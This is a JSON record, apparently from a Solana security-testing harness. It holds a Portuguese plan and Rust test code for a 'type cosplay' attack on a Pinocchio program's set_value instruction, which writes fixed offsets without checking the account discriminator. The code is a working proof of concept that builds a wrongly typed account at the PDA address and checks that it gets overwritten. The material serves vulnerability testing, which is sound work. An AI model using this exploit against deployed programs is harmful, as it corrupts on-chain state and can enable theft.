{
  "plan": "O programa set_value (Pinocchio) escreve diretamente nos offsets 8..40 (user), 40..48 (value) e 48 (bump) da conta de dados, sem verificar discriminador de tipo. O PDA e derivado de [b"data", user.key(), bump] e a unica validacao e que a conta passada seja esse PDA. Para o ataque COSPLAY, criamos uma conta no endereco do PDA com um layout de outro tipo (discriminador diferente do esperado), passamos essa conta como data_account e chamamos set_value com um user e value arbitrarios. O baseline usa a mesma instrucao com uma conta de dados com o layout esperado (discriminador correto) e deve ter sucesso; o ataque usa a conta com layout diferente e, se aceito, sobrescreve os offsets 8..48, corrompendo o estado de uma conta de outro tipo. O efeito medido e que os bytes 8..40 da conta apos o ataque sao iguais a chave do user do ataque, provando que o programa tratou uma conta de tipo diferente como a conta de dados.",
  "scenario": "let user = Pubkey::new_unique();
let bump: u8 = 255;
let (pda, _) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Conta de dados legitima: discriminador do tipo esperado + campos
let legit_data = anchor_account_data("DataAccount", &(user, 0u64, bump));
let legit_account = account(&env.program_id, &legit_data, None);

// Conta COSPLAY: mesmo endereco PDA, mas com layout/discriminador de outro tipo
let cosplay_data = anchor_account_data("OtherAccount", &(Pubkey::new_unique(), 123u64, 7u8));
let cosplay_account = account(&env.program_id, &cosplay_data, None);

let value: u64 = 0xDEADBEEFCAFEBABE;
let ix_data = [IX_SET_VALUE, bump, value.to_le_bytes()[0], value.to_le_bytes()[1], value.to_le_bytes()[2], value.to_le_bytes()[3], value.to_le_bytes()[4], value.to_le_bytes()[5], value.to_le_bytes()[6], value.to_le_bytes()[7]];

let metas = vec![
    AccountMeta::new(pda, false),
    AccountMeta::new_readonly(user, false),
];

// Baseline: conta de dados com o layout esperado
let baseline_ix = env.raw_ix(&ix_data, metas.clone());
let baseline_accounts = vec![(pda, legit_account), (user, wallet(1_000_000_000))];
let base = env.baseline("set_value com conta de dados legitima", &baseline_ix, &baseline_accounts);

// Ataque: mesma instrucao, mas conta de dados com layout de outro tipo
let attack_ix = env.raw_ix(&ix_data, metas);
let attack_accounts = vec![(pda, cosplay_account), (user, wallet(1_000_000_000))];
let r = env.attack("set_value com conta de dados de outro tipo (COSPLAY)", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let data_after = after(&r, &pda).data();
    let user_bytes = user.to_bytes();
    let overwritten = data_after.len() >= 40 && data_after[8..40] == user_bytes;
    env.effect("conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user", overwritten);
}"
}

